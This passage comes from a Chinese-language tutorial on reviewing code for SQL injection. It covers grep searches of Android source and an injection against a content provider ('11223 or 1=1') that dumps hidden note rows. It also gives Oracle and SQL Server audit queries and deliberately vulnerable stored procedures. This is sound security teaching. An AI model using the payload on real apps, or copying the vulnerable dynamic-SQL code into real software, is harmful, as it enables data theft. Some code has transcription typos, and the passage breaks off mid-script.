<span class="token function">replaceOrThrow</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialValues<span class="token punctuation">)</span>
<span class="token comment">//更新数据库中数据行的便捷方法</span>
<span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> values<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">)</span>
<span class="token comment">//更新数据库中数据行的便捷方法</span>
<span class="token function">updateWithOnConflict</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> values<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">,</span> <span class="token keyword">int</span> conflictAlgorithm<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="跟踪数据-1"><a href="#跟踪数据-1" class="headerlink" title="跟踪数据"></a>跟踪数据</h5><p>通过shell命令在源文件中查找上述类方法</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"delete(\|execSQL(\|insert(\|insertOrThrow(\|insertWithO nConflict(\|query(\|queryWithFactory(\|rawQuery(\|rawQueryWithFacto ry(\|replace(\|replaceOrThrow(\|update(\丨 updateWithOnConflict(\|buildQuery(\|buildQueryString(\|buildUnionQuery(\|buildUnionSubQuery(\ | query("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>搜索包含动态SQL语句的字符串</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"String.*=.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'(print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>示例</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ svn checkout http://android-sap-note-viewer.googlecode.com/svn/trunk/sap-note-viewer
$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"delete(\|execSQL(\|insert(\|insertOrThrow(\|insertWithOnConflict(\|query(\|queryWithFactory(\|rawQuery(\|rawQueryWithFactory(\|replace(\|replaceOrThrow(\|update(\|updateWithOnConflict(\|buildQuery(\|buildQueryString(\|buildUnionQuery(\|buildUnionSubQuery(\ | query("</span> sap-note-viewer/ <span class="token operator">|</span> <span class="token function">awk</span> -F:	<span class="token string">'{print nfilename: "$l"\nline: "$2"\
nmatch: "$3"\n\n"}'</span>
filename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.java
line: <span class="token number">106</span>
match: public Cursor query<span class="token punctuation">(</span>Uri uri, String<span class="token punctuation">[</span><span class="token punctuation">]</span> projection, String selection, String<span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs, String sortOrder<span class="token punctuation">)</span> <span class="token punctuation">{</span>
filename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.java
line: <span class="token number">121</span>
match: Cursor c <span class="token operator">=</span> qBuilder.query<span class="token punctuation">(</span>db, projection, selection, selectionArgs, null, null, sortOrder<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>源码</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token class-name">Cursor</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">Uri</span> uri<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projection<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span>
<span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token class-name">SQLiteQueryBuilder</span> qBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLiteQueryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
qBuilder<span class="token punctuation">.</span><span class="token function">setTables</span><span class="token punctuation">(</span><span class="token constant">DATABASE_TABLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//如果搜索为空，就添加一个通配符，在内容之前和之后添加通配符</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>selectionArgs<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"%"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>selectionArgs<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
selectionArgs <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span>selectionArgs <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//将内部字段映射到SearchManager理解的字段</span>
qBuilder<span class="token punctuation">.</span><span class="token function">setProjectionMap</span><span class="token punctuation">(</span><span class="token constant">NOTE_PROJECTION_MAP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">SQLiteDatabase</span> db <span class="token operator">=</span> dbHelper<span class="token punctuation">.</span><span class="token function">getReadableDatabase</span><span class="token punctuation">(</span>〉；
<span class="token comment">//执行査询</span>
<span class="token class-name">Cursor</span> c <span class="token operator">=</span> qBuilder<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>db<span class="token punctuation">,</span> projection<span class="token punctuation">,</span> selection<span class="token punctuation">,</span> selectionArgs<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> sortOrder<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> c<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>WebContentResolver向所有己经安装的内容提供程序(Content-Provider)暴露了一个Web Service接口。可以用WebContentResolver实用工具列出所有可访问的内容提供程序。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8080/list
package: org.sapmentors.sapnoteview
authority: org.sapmentors.sapnoteview.noteprovider
exported: <span class="token boolean">true</span>
readPerm: null
writePerm: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行查询</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8080/query?a<span class="token operator">=</span>org.sapmentors.sapnoteview.noteprovider?<span class="token operator">&amp;</span><span class="token assign-left variable">selName</span><span class="token operator">=</span>_id<span class="token operator">&amp;</span><span class="token assign-left variable">seiId</span><span class="token operator">=</span><span class="token number">11223</span>
Query successful:
Column count: <span class="token number">3</span>
Row count: <span class="token number">1</span>
I	_id <span class="token operator">|</span> suggest_text_l <span class="token operator">|</span> suggest_intent_data
I <span class="token number">11223</span> <span class="token operator">|</span> secret text 丨 <span class="token number">11223</span>

<span class="token comment">#实际SQL语句</span>
<span class="token comment">#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行注入</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$curl</span> http://127.0.0.1:8080/query?a<span class="token operator">=</span>org.sapmentors.sapnoteview, noteprovider?<span class="token operator">&amp;</span><span class="token assign-left variable">selName</span><span class="token operator">=</span>_id<span class="token operator">&amp;</span><span class="token assign-left variable">selId</span><span class="token operator">=</span>l1223%20or%201<span class="token operator">=</span><span class="token number">1</span>
Query successful:
Column count: <span class="token number">3</span>
Row count: <span class="token number">4</span>
<span class="token operator">|</span> _id <span class="token operator">|</span> suggest_text_l <span class="token operator">|</span>suggest_intent_data
<span class="token operator">|</span> <span class="token number">11223</span> <span class="token operator">|</span> secret text <span class="token operator">|</span> <span class="token number">11223</span>
<span class="token operator">|</span> <span class="token number">12345</span> <span class="token operator">|</span> secret text <span class="token operator">|</span> <span class="token number">12345</span>
<span class="token operator">|</span> <span class="token number">54321</span> <span class="token operator">|</span> super secret text <span class="token operator">|</span> <span class="token number">54321</span>
<span class="token operator">|</span> <span class="token number">98765</span> <span class="token operator">|</span> shhhh secret <span class="token operator">|</span> <span class="token number">98765</span>

<span class="token comment">#实际SQL语句</span>
<span class="token comment">#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223 or 1=1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>selName和selId这两个参数易感染，存在SQL注入</p>
<h4 id="复查PL-SQL和T-SQL代码"><a href="#复查PL-SQL和T-SQL代码" class="headerlink" title="复查PL/SQL和T-SQL代码"></a>复查PL/SQL和T-SQL代码</h4><h5 id="PL-SQL"><a href="#PL-SQL" class="headerlink" title="PL/SQL"></a>PL/SQL</h5><p>Oracle一直深受多种PL/SQL注入漏洞的困扰，这些漏洞位于数据库产品默认安装的内置数据库包的代码中。PL/SQL代码以definer权限执行，是提升权限的攻击者攻击对象。</p>
<p>存储过程既能够以调用者权限(authid current_user)运行，也能够以存储过程所有者权限 (authid definer)运行。创建存储过程时，可以使用authid子句指定该行为。</p>
<p>要分析PL/SQL有两种选择</p>
<h6 id="一种是将源代码从数据库导出来"><a href="#一种是将源代码从数据库导出来" class="headerlink" title="一种是将源代码从数据库导出来"></a>一种是将源代码从数据库导出来</h6><p>可以使用dbms_metadata包实现该目标，可以使用下面SQL*Plus脚本将DDL(Data Definition Language,数据定义语言)语句从Oracle数据库导出来。DDL语句是定义或修改数据结构(比如 表)的SQL语句。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Purpose: A PL/SQL script to export the DDL code for all database objects ——Version: v 0.0.1</span>
<span class="token comment">-- Works against: Oracle 9i, lOg and llg</span>
<span class="token comment">-- Author: Alexander Kornbrust of Red-Database-Security GmbH</span>
<span class="token keyword">set</span> echo <span class="token keyword">off</span> feed <span class="token keyword">off</span> pages <span class="token number">0</span> trims <span class="token keyword">on</span> term <span class="token keyword">on</span> trim <span class="token keyword">on</span> linesize <span class="token number">255</span> long <span class="token number">500000</span> head <span class="token keyword">off</span>
<span class="token comment">--</span>
<span class="token keyword">execute</span> DBMS_METADATA<span class="token punctuation">.</span>SET_TRANSFORM_PARAM<span class="token punctuation">(</span>DBMS_METADATA<span class="token punctuation">.</span>SESSION_
TRANSFORM<span class="token punctuation">,</span> <span class="token string">'STORAGE'</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
spool getallunwrapped<span class="token punctuation">.</span><span class="token keyword">sql</span>
<span class="token keyword">select</span> <span class="token string">'spool ddl_source_unwrapped.txt'</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>
<span class="token comment">-- create a SQL scripts containing all unwrapped objects</span>
<span class="token keyword">select</span> <span class="token string">'select dbms_metadata.get_ddl('''</span><span class="token operator">||</span>object_type<span class="token operator">||</span><span class="token string">''','''</span><span class="token operator">||</span>object_name<span class="token operator">||</span><span class="token string">''','''</span><span class="token operator">||</span>owner<span class="token operator">||</span><span class="token string">''') from dual;'</span>
<span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_objects <span class="token keyword">where</span> object_id <span class="token operator">not</span> <span class="token operator">in</span><span class="token punctuation">(</span><span class="token keyword">select</span> o<span class="token punctuation">.</span>obj<span class="token comment"># from source$ s, obj$ o,user$ u where ((lower(s.source) like '%function%wrapped%') or (lower (s.source) like '%procedure%wrapped%') or (lower(s.source) like '%package%wrapped%')) and o.obj#=s .obj# and u.user#=o.owner#)) where object_type in ('FUNCTION',	'PROCEDURE', 'PACKAGE', 'TRIGGER')</span>
<span class="token operator">and</span> owner <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'SYS'</span><span class="token punctuation">)</span> 
<span class="token keyword">order</span> <span class="token keyword">by</span> owner<span class="token punctuation">,</span>object_type<span class="token punctuation">,</span>object_name<span class="token punctuation">;</span>
<span class="token comment">-- spool a spool off into the spool file.</span>
<span class="token keyword">select</span> <span class="token string">'spool off'</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>
spool <span class="token keyword">off</span>
<span class="token comment">--</span>
<span class="token comment">-- generate the DDL_source</span>
<span class="token variable">@getallunwrapped.sql</span>
quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="另一种是构造自己的SQL语句来搜索PL-SQL代码"><a href="#另一种是构造自己的SQL语句来搜索PL-SQL代码" class="headerlink" title="另一种是构造自己的SQL语句来搜索PL/SQL代码"></a>另一种是构造自己的SQL语句来搜索PL/SQL代码</h6><p>Oracle在 ALL_SOURCE和DBA_SOURCE视图中存储PL/SQL源代码。可以通过访问两个视图之一的TEXT列实现该目的。最值得关注的是使用了execute immediate或dbms sql函数的代码。Oracle的PL/SQL是区分大小写的，一定要在查询中使用lower(text)函数，它会将文本值转换为小写字母以便LIKE语句能匹配所有可能的情况。</p>
<p>使用下列SQL语句来获取PL/SQL代码的源</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner <span class="token keyword">AS</span> Owner<span class="token punctuation">,</span> name <span class="token keyword">AS</span> Name<span class="token punctuation">,</span> <span class="token keyword">type</span> <span class="token keyword">AS</span> <span class="token keyword">Type</span><span class="token punctuation">,</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">WHERE</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>LOWER<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token string">'%immediate%'</span><span class="token punctuation">)</span> <span class="token operator">OR</span> <span class="token punctuation">(</span>LOWER<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token string">'%dbms_sql'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">AND</span> owner<span class="token operator">=</span> <span class="token string">'PLSQL'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://images.dadream.eu.org/images/2024/07/840f9086a329bf41df56550583bdcb36.png"></p>
<p>这三条语句易受到攻击，未验证的参数传给了危险的函数</p>
<p>寻找参数复制给局部定义的变量</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner <span class="token keyword">AS</span> Owner<span class="token punctuation">,</span> name <span class="token keyword">AS</span> Name<span class="token punctuation">,</span> <span class="token keyword">type</span> <span class="token keyword">AS</span> <span class="token keyword">Type</span><span class="token punctuation">,</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">where</span> lower<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%:=%||%''%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://images.dadream.eu.org/images/2024/07/d4fd03c14a6b885f11cfe09069f46727.png"></p>
<p>上述SQL语句找到了一个利用用户控制的数据动态创建SQL语句的包。我们有必要对该包做进一步审查，可以使用下列SQL语句追溯包(package)的源以便进一步审查其内容</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">WHERE</span> name<span class="token operator">=</span><span class="token string">'SP_STORED_PROCEDURE'</span> <span class="token operator">AND</span> owner<span class="token operator">=</span><span class="token string">'SYSMAN'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> line<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://images.dadream.eu.org/images/2024/07/268e43e5f0121d8c4c2fc627816da7d0.png"></p>
<p>input直接与SQL字符串相连，可以判断存在SQL注入</p>
<p>搜索数据库中所有的代码</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Purpose: A PL/SQL script to search the DB for potentially vulnerable </span>
<span class="token comment">-- PL/SQL code</span>
—<span class="token operator">-</span> Version: v <span class="token number">0.0</span><span class="token number">.1</span>
<span class="token comment">-- Works against: Oracle 9i, 10g and llg</span>
——Author: Alexander Kornbrust <span class="token keyword">of</span> Red<span class="token operator">-</span><span class="token keyword">Database</span><span class="token operator">-</span>Security GmbH
<span class="token keyword">select</span> <span class="token keyword">distinct</span> a<span class="token punctuation">.</span>owner<span class="token punctuation">,</span>a•name<span class="token punctuation">,</span>b<span class="token punctuation">.</span>authid<span class="token punctuation">,</span>a<span class="token punctuation">.</span><span class="token keyword">text</span> SQLTEXT <span class="token keyword">from</span> all_source a<span class="token punctuation">,</span>all_procedures b
<span class="token keyword">where</span> <span class="token punctuation">(</span>
lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%execute%immediate%(%||%)%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_sql%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%grant%to%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%alter%user%identified%by%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%execute%immediate%''%||%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_%utility.exec_ddl_statement%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_ddl.create_wrapped%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_hs_pass_through.execute_immediate%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_hs_passthrough.parse%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_util.bind_variables%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_util.listprint%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_ util.tableprint%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_sys_sq1.%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%ltadm.execsql%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_prvtaqim.execute_stmt%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_streams_rpc.execute_stmt%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_aqadm_sys.execute_stmt%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_streams_adm_utl.execute_ sql_ string%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%initjvmaux.exec%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_repcat_sql_utl.do_sql%'</span>
<span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_aqadm_syscalls.kwqa3_gl_executestmt%'</span>
<span class="token operator">and</span> lower<span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token operator">like</span> <span class="token string">'% wrapped%'</span> <span class="token operator">and</span> a<span class="token punctuation">.</span>owner<span class="token operator">=</span>b<span class="token punctuation">.</span>owner <span class="token operator">and</span> a<span class="token punctuation">.</span>name<span class="token operator">=</span>b<span class="token punctuation">.</span>obj ect_name <span class="token operator">and</span> a<span class="token punctuation">.</span>owner <span class="token operator">not</span> <span class="token operator">in</span>
<span class="token punctuation">(</span><span class="token string">'OLAPSYS'</span><span class="token punctuation">,</span> <span class="token string">'ORACLE_OCM'</span><span class="token punctuation">,</span> <span class="token string">'CTXSYS'</span><span class="token punctuation">,</span> <span class="token string">'OUTLN'</span><span class="token punctuation">,</span> <span class="token string">'SYSTEM'</span><span class="token punctuation">,</span> <span class="token string">'EXFSYS'</span><span class="token punctuation">,</span> <span class="token string">'MDSYS'</span><span class="token punctuation">,</span><span class="token string">'SYS'</span><span class="token punctuation">,</span><span class="token string">'SYSMAN'</span><span class="token punctuation">,</span><span class="token string">'WKSYS'</span><span class="token punctuation">,</span><span class="token string">'XDB'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_040000'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_030000'</span><span class="token punctuation">,</span> <span class="token string">'FLOWS_030100'</span><span class="token punctuation">,</span>	<span class="token string">'FLOWS_020000'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_020100'</span><span class="token punctuation">,</span><span class="token string">'FLOWS020000'</span><span class="token punctuation">,</span>
<span class="token string">'FLOWS_010600'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_010500'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_010400'</span><span class="token punctuation">)</span>
<span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="T-SQL"><a href="#T-SQL" class="headerlink" title="T-SQL"></a>T-SQL</h5><p>sp_helptext存储过程会显示用于在多行中创建对象的定义。每一行均包含了 T-SQL 定义的255个字符。该定义位于sys.sql_modules目录视图的definition列中。</p>
<p>一个储存过程源代码</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_helptext SP_StoredProcedure<span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token variable">@input</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">NULL</span> <span class="token keyword">AS</span> <span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span>
<span class="token keyword">SELECT</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span> <span class="token string">''''</span> 
<span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到@input变量来自用户直接输入与SQL字符串相连，产生SQL注入</p>
<p>使用sp_executesql和EXEC()两条命令来调用动态SQL，sp_executesql是一个内置存储过程，接收两个预定义的参数和任意多个用户定义参数。第一个参数@stmt是强制参数，包含一条或一批 SQL语句。在SQL 7和SQL 2000中，@stmt的数据类型是ntext,在SQL Server 2005及之后 的版本中是nvarchar(MAX)。第二个参数@params是可选参数。EXEC()接收一个参数，该参数是一条要执行的SQL语句。它可以由字符串变量和字符串常量连接而成。</p>
<p>下面是一个使用了 sp_executesql存储过程且易受到攻击的存储过程示例</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_helptext SP_StoredProcedure_II<span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure_II <span class="token punctuation">(</span><span class="token variable">@input</span> nvarchar<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">AS</span>
<span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span>
<span class="token keyword">SET</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span><span class="token string">''''</span> 
<span class="token keyword">EXEC</span> sp_executesql <span class="token variable">@sql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>列出所有储存过程</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> <span class="token keyword">type</span> <span class="token operator">=</span><span class="token string">'P'</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> name <span class="token keyword">asc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用脚本找到所有储存过程</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Description: A T-SQL script to search the DB for potentially vulnerable </span>
<span class="token comment">-- T-SQL code</span>
<span class="token comment">-- @text - search string '%text%'</span>
